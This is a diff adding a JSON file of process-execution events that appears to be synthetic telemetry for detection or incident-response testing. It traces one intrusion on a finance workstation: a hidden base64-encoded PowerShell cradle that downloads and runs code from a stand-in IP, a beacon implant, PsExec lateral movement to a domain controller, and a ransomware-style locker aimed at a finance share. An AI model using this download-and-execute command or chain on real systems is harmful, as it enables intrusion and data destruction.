@@ -1,0 +1,46 @@
+[
+  {
+    "timestamp": "2025-03-07T14:32:11Z",
+    "host": "WKS-FIN-PC04",
+    "user": "jdoe@contoso.com",
+    "process_name": "powershell.exe",
+    "command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMAOgA4ADAAOAAwAC8AYQAnACkA",
+    "parent_process": "explorer.exe",
+    "pid": 5544,
+    "parent_pid": 1024,
+    "sha256": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"
+  },
+  {
+    "timestamp": "2025-03-07T14:33:02Z",
+    "host": "WKS-FIN-PC04",
+    "user": "jdoe@contoso.com",
+    "process_name": "beacon.exe",
+    "command_line": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\beacon.exe",
+    "parent_process": "powershell.exe",
+    "pid": 7820,
+    "parent_pid": 5544,
+    "sha256": "deadbeef1234567890abcdef1234567890abcdef1234567890abcdef12345678"
+  },
+  {
+    "timestamp": "2025-03-07T14:50:15Z",
+    "host": "WKS-FIN-PC04",
+    "user": "CONTOSO\\admin-svc",
+    "process_name": "psexec.exe",
+    "command_line": "psexec.exe \\\\DC01 -u CONTOSO\\admin-svc -p *** cmd.exe",
+    "parent_process": "beacon.exe",
+    "pid": 8012,
+    "parent_pid": 7820,
+    "sha256": "11223344556677889900aabbccddeeff11223344556677889900aabbccddeeff"
+  },
+  {
+    "timestamp": "2025-03-07T14:58:00Z",
+    "host": "WKS-FIN-PC04",
+    "user": "jdoe@contoso.com",
+    "process_name": "locker.exe",
+    "command_line": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\locker.exe --target \\\\FILESRV01\\finance$",
+    "parent_process": "beacon.exe",
+    "pid": 9100,
+    "parent_pid": 7820,
+    "sha256": "aabbccdd11223344aabbccdd11223344aabbccdd11223344aabbccdd11223344"
+  }
+]
